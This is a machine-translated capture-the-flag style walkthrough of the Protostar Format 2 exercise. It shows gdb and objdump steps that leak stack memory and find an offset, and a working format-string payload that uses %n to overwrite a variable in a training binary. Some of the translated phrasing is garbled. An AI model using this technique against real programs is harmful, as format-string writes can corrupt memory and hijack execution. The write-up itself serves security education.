<html>
<head>
<title>[ExpDev] Exploit Exercise | Protostar | Format 2</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[ExpDev]漏洞利用练习|原恒星|格式2</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-2-73ef08011a8c?source=collection_archive---------1-----------------------#2020-05-28">https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-2-73ef08011a8c?source=collection_archive---------1-----------------------#2020-05-28</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/2efb532c4538935e46dd82617a38cc92.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Olrr__pADFHp-Ygy.png"/></div></div></figure><h1 id="caa0" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">格式2(格式字符串基本2)</h1><p id="7db0" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">这个挑战的目标是找到我们可以在内存中写入所提供的输入的位置，并找到正确的偏移值来打印获胜的语句。</p><ul class=""><li id="e612" class="lx ly it lb b lc lz lg ma lk mb lo mc ls md lw me mf mg mh bi translated">链接:<a class="ae mi" href="https://exploit-exercises.lains.space/protostar/format2/" rel="noopener ugc nofollow" target="_blank">https://exploit-exercises.lains.space/protostar/format2/</a></li></ul><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mj"><img src="../Images/a4b6ea2750c378d19c4f67bebcf28125.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0G53MkheqzjAyZxapXgqyA.png"/></div></div></figure><h2 id="80d8" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">注意事项</h2><ul class=""><li id="456d" class="lx ly it lb b lc ld lg lh lk na lo nb ls nc lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">char buffer[512]</strong></code>:设置缓冲区大小为512。</li><li id="f3e2" class="lx ly it lb b lc nh lg ni lk nj lo nk ls nl lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">fgets(buffer, sizeof(buffer), stdin)</strong></code>:获取用户提供的输入。并且它将缓冲区大小限制为512。我们最多可以输入511个字节，因为C总是在末尾添加<code class="fe nd ne nf ng b">0x00</code>作为终止符。</li><li id="947b" class="lx ly it lb b lc nh lg ni lk nj lo nk ls nl lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">printf(buffer);</strong></code>:这是这段代码中易受攻击的函数。<code class="fe nd ne nf ng b">printf()</code>将<em class="nm">而不是</em>检查所提供的输入是否是预期的格式字符串，因为它被编码为接受任何字符串值。因此，我们所能做的只是验证我们是否可以泄漏内存地址，并且还可以将任意代码写入堆栈(<strong class="lb iu">【读取】</strong> <code class="fe nd ne nf ng b">%p</code>或<code class="fe nd ne nf ng b">%x</code> → <strong class="lb iu">【写入】</strong> <code class="fe nd ne nf ng b">%n</code>)。</li><li id="c2b9" class="lx ly it lb b lc nh lg ni lk nj lo nk ls nl lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">if(target == 64) {</strong></code>:变量<code class="fe nd ne nf ng b">target</code>是我们需要查找的地址。然后，通过利用格式字符串漏洞，我们将向<code class="fe nd ne nf ng b">target</code>写入任意字节来匹配64，以打印出获胜的语句。</li></ul></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h1 id="df61" class="kb kc it bd kd ke nu kg kh ki nv kk kl km nw ko kp kq nx ks kt ku ny kw kx ky bi translated">拆解(GDB)</h1><p id="c055" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">让我们反汇编二进制文件，看看在ASM级别做了什么:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="8c0f" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ gdb -q format2</strong><br/>Reading symbols from /opt/protostar/bin/format2...done.<br/><strong class="ng iu">(gdb) set disassembly-flavor intel<br/>(gdb) disassemble vuln</strong></span></pre><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oh"><img src="../Images/1e065522e7005860581ed691eca53cde.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ae1HFND5S5niPtSqBq3eBQ.png"/></div></div></figure></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h1 id="ff1c" class="kb kc it bd kd ke nu kg kh ki nv kk kl km nw ko kp kq nx ks kt ku ny kw kx ky bi translated">剥削</h1><h2 id="ae73" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">初步侦察</h2><p id="925f" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">当我们提供一个随机字符串时，它会回显出来，并打印出“target is 0:(”</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="f1a2" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ python -c 'print "AAAA"' | /opt/protostar/bin/format2</strong><br/>AAAA<br/>target is 0 :(</span></pre><p id="876b" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">但是如果我们提供一些格式字符串参数(<code class="fe nd ne nf ng b">%x</code>)，我们会得到一些有趣的输出:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="fe54" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ python -c 'print "AAAA" + "|%08x" * 2' | /opt/protostar/bin/format2</strong><br/>AAAA|0000200|b7fd8420    <strong class="ng iu">&lt;-- Leaking memory address</strong><br/>target is 0 :(</span><span id="0560" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu"><em class="nm">### Format String Explanation<br/>"%08x"</em></strong><em class="nm"> = "%x" is a Format String parameter of the hexdecimal <br/>         representation. The number "08" is called "width field" and <br/>         is the minimum which will pad the output of the %x <br/>         specified to 8 characters = 4 bytes long.</em></span></pre><h2 id="182a" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">寻找偏移</h2><p id="cf4c" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">接下来，我们需要找到偏移值，我们可以在堆栈上看到我们提供的输入。尝试增加几个<code class="fe nd ne nf ng b">%x</code>，我们可以发现偏移量为4。</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="9555" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ python -c 'print "AAAA" + "|%08x" * 4' | /opt/protostar/bin/format2</strong><br/>AAAA|00000200|b7fd8420|bffff5d4|<strong class="ng iu">41414141    &lt;-- chr(0x41) = "A"</strong><br/>target is 0 :(</span></pre><h2 id="d4a3" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">寻找“目标”变量地址</h2><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="3e7f" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ objdump -t format2 |grep target</strong><br/><strong class="ng iu">080496e4</strong> g     O .bss <strong class="ng iu">00000004</strong>              target</span></pre><p id="2b5b" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated"><code class="fe nd ne nf ng b">target</code>的地址存在于<code class="fe nd ne nf ng b">0x080496e4</code>中。将它转换成little-endian格式= <code class="fe nd ne nf ng b">\xe4\x96\x04\x08</code>。</p><p id="371f" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">将电源输入更改为找到的<code class="fe nd ne nf ng b">target</code>地址。但是这次让我们看看是否可以使用<code class="fe nd ne nf ng b">%n</code>在内存中写一些东西(= <em class="nm">写入作为参数</em>给出的地址中的字符数)。</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="6358" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ python -c 'print "\xe4\x96\x04\x08" + "%4$n"' | /opt/protostar/bin/format2</strong><br/>�<br/>target is 4 :(    <strong class="ng iu">&lt;-- It wrote "4" at the "target" location</strong></span><span id="146a" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu"><em class="nm">### Format String Explanation<br/>"%4$08n"</em></strong><em class="nm"> = Directly access the 4th parameter on stack with "4$" and <br/>           write the address </em>(\xe4\x96\x04\x08<strong class="ng iu">) </strong><em class="nm">there with "%08n"</em></span></pre></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h2 id="c584" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">最终利用</h2><p id="0bc0" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">太棒了。我们的下一个任务现在很清楚了，我们只需要计算出在将输出写入<code class="fe nd ne nf ng b">target</code>时，需要多少额外的填充或宽度字段才能使输出达到64 (= <code class="fe nd ne nf ng b">0x40</code>十六进制)。肯定有更好的方法来解决这个问题，但是管它呢，这次让我们简单地做一个试错法😛。</p><p id="1e8d" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">好的，所以当我们添加更多的焊盘时，它会增加在<code class="fe nd ne nf ng b">target</code>写入的输出。所以增加<code class="fe nd ne nf ng b">%60d</code>宽度解决了这个挑战。</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="b443" class="mo kc it ng b gy od oe l of og">$ python -c 'print "\xe4\x96\x04\x08" + <strong class="ng iu">"%10d" + "%4$08n"</strong>' | /opt/protostar/bin/format2<br/>       512<br/>target is 14 :(</span><span id="6b50" class="mo kc it ng b gy ol oe l of og">$ python -c 'print "\xe4\x96\x04\x08" + <strong class="ng iu">"%20d" + "%4$08n"</strong>' | /opt/protostar/bin/format2<br/>                 512<br/>target is 24 :(</span><span id="4400" class="mo kc it ng b gy ol oe l of og">$ python -c 'print "\xe4\x96\x04\x08" + <strong class="ng iu">"%60d" + "%4$08n"</strong>' | /opt/protostar/bin/format2<br/>                                                         512<br/><strong class="ng iu">you have modified the target :)</strong></span></pre><h2 id="e50a" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">最终利用# 2(*优雅的解决方案)</h2><p id="bc44" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">好吧，等等。让我用一种优雅的方式解释一下🙂。我将向您展示如何计算精确的宽度字段，以获得我们想要的输出。</p><p id="002a" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">首先，让我们将初始有效载荷(没有宽度填充)放入一个文件，这样我们就可以用gdb运行它。</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="e13d" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">[Initial Payload]</strong><br/>$ python -c 'print "\xe4\x96\x04\x08" + "%4$n"' &gt; format2_payload</span></pre><p id="0250" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">用gdb运行<code class="fe nd ne nf ng b">Format 2</code>，将断点设置在<code class="fe nd ne nf ng b">cmp eax, 0x40</code>位置。</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="3581" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ gdb -q format2</strong><br/>  Reading symbols from /opt/protostar/bin/format2...done.<br/><strong class="ng iu">(gdb) set disassembly-flavor intel <br/>(gdb) disassemble vuln</strong><br/>  Dump of assembler code for function vuln:<br/>  ...(snip)...<br/>  0x0804848a &lt;vuln+54&gt;: mov    eax,ds:0x80496e4<br/>  <strong class="ng iu">0x0804848f &lt;vuln+59&gt;: cmp    eax,0x40</strong><br/>  ...(snip)...  <br/>  End of assembler dump.<br/><strong class="ng iu">(gdb) break * 0x0804848f    &lt;-- Breakpoint</strong></span></pre><p id="4a2e" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">现在，让我们用有效载荷运行程序。</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="237a" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">(gdb) run &lt; /home/user/format2/format2_payload</strong><br/><br/><strong class="ng iu">### Search for the "target"</strong><br/><strong class="ng iu">(gdb) x/5x 0x80496e4</strong><br/>  0x80496e4 &lt;target&gt;: <strong class="ng iu">0x00000004</strong> 0x00000000 0x00000000 0x00000000<br/>  0x80496f4         : 0x00000000</span></pre><p id="545f" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">你可以看到“4”被写入了<code class="fe nd ne nf ng b">target</code>。有一种方法可以计算出我们需要填充多少宽度才能得到我们想要的输出。</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="40bf" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">### Width Calculation</strong><br/>"Desired byte" - "Current byte" = "Width"</span></pre><p id="9276" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">我们在广发行做这个吧。</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="a025" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">(gdb) print 0x40 - 0x04</strong><br/>  $1 = 60</span><span id="a355" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">"0x40"</strong> = Hex representation of decimal 64 of our desired value<br/><strong class="ng iu">"0x04"</strong> = The currently outputted value at the "target"</span></pre><p id="c54c" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">好的，它计算了60的差异，这是我们的宽度。让我们更新我们的有效载荷，并再次反馈给gdb进行确认。</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="02a1" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">[Final Payload]</strong><br/>$ python -c 'print "\xe4\x96\x04\x08" + "%60d" + "%4$n"' &gt; format2_payload</span><span id="639f" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">[GDB]</strong><br/><strong class="ng iu">(gdb) run &lt; /home/user/format2/format2_payload</strong><br/>  Starting program: /opt/protostar/bin/format2 &lt; /home/user/format2 <br/>  /format2_payload<br/>                                                         512</span><span id="b3c7" class="mo kc it ng b gy ol oe l of og">  Breakpoint 1, 0x0804848f in vuln () at format2/format2.c:15<br/>  15 in format2/format2.c<br/><strong class="ng iu">(gdb) x/5x 0x80496e4</strong><br/>  0x80496e4 &lt;target&gt;: <strong class="ng iu">0x00000040</strong> 0x00000000 0x00000000 0x00000000<br/>  0x80496f4.        : 0x00000000<br/><strong class="ng iu">--&gt; The output is updated to 0x40 (= 64 in decimal)</strong></span><span id="539a" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">(gdb) x/3i $eip    &lt;-- Querying next 3 instruction pointers</strong><br/>  0x804848f &lt;vuln+59&gt;: cmp    eax,0x40<br/>  0x8048492 &lt;vuln+62&gt;: jne    0x80484a2 &lt;vuln+78&gt;<br/>  0x8048494 &lt;vuln+64&gt;: mov    DWORD PTR [esp],0x8048590<br/><strong class="ng iu">(gdb) continue</strong><br/>  Continuing.<br/>  <strong class="ng iu">you have modified the target :)</strong></span><span id="2cf8" class="mo kc it ng b gy ol oe l of og">  Program exited with code 040.</span></pre><p id="fb57" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">感谢阅读！</p><h2 id="569e" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">下一个挑战:</h2><ul class=""><li id="f56b" class="lx ly it lb b lc ld lg lh lk na lo nb ls nc lw me mf mg mh bi translated"><a class="ae mi" href="https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-format-3-33e8d8f1e83" rel="noopener"> <strong class="lb iu">格式3 </strong> </a>:格式字符串利用:基本3</li></ul><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi om"><img src="../Images/4386dc7dccb932a5644c84bedccdd603.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*rniUcD9tygsUPJRC.png"/></div></div></figure></div></div>    
</body>
</html>